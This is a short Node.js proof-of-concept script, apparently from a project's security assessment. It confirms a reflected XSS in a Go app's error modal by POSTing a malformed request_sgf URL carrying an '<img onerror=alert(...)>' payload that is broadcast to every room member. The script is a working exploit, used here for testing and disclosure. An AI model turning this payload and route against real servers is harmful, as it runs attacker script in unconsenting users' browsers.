// Reflected XSS via the broadcast error modal (SECURITY_ASSESSMENT.md — XSS-2, HIGH).
// A malformed request_sgf URL makes Go's url.Parse error, whose %q-formatted text
// keeps <>/spaces; handleRequestSGF broadcasts it as an ErrorEvent to EVERY room
// member, and network_handler routes it to show_error_modal -> span.innerHTML =
// "&nbsp;" + message (modals.js:183). Unauthenticated, no victim interaction.
// The payload must contain no double quotes (%q would escape them).
// Usage: node security/poc/browser/xss_error_modal.js [http://localhost:8080]
function loadPlaywright(){for(const p of ['playwright','/opt/node22/lib/node_modules/playwright']){try{return require(p);}catch(e){}}console.error('playwright not found; npm i -g playwright');process.exit(2);}
const { chromium } = loadPlaywright();
const http = require('http');
const base = process.argv[2] || 'http://localhost:8080';
const U = new URL(base);
function post(p,b){return new Promise((res,rej)=>{const d=Buffer.from(b);const r=http.request({host:U.hostname,port:U.port,path:p,method:'POST',headers:{'Content-Type':'application/json','Content-Length':d.length}},x=>{let s='';x.on('data',c=>s+=c);x.on('end',()=>res(s));});r.on('error',rej);r.write(d);r.end();});}
const BOOT=`window.bootstrap={Modal:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Toast:class{show(){}hide(){}static getOrCreateInstance(){return new this();}},Collapse:class{show(){}hide(){}toggle(){}static getOrCreateInstance(){return new this();}},Tooltip:class{dispose(){}},Dropdown:class{}};`;
(async()=>{
  const room='poc-xss2-'+Date.now();
  const browser=await chromium.launch();const page=await browser.newPage();
  await page.addInitScript(BOOT);
  await page.route('**/cdn.jsdelivr.net/**',r=>r.fulfill({status:200,contentType:'text/css',body:''}));
  let fired=null; page.on('dialog',async d=>{fired=d.message();await d.dismiss();});
  await page.goto(base+'/b/'+room,{waitUntil:'domcontentloaded'});
  await page.waitForTimeout(2000); // victim connected
  await post('/api/v1/room/'+room, JSON.stringify({event:'request_sgf', value:'http://<img src=x onerror=alert(document.domain)>'}));
  await page.waitForTimeout(2000);
  await browser.close();
  if(fired!==null){console.log('[+] XSS-2 CONFIRMED — broadcast error modal executed JS in the victim ('+fired+')');process.exit(0);}
  console.log('[-] not fired');process.exit(1);
})().catch(e=>{console.error('ERR',e.message);process.exit(1);});
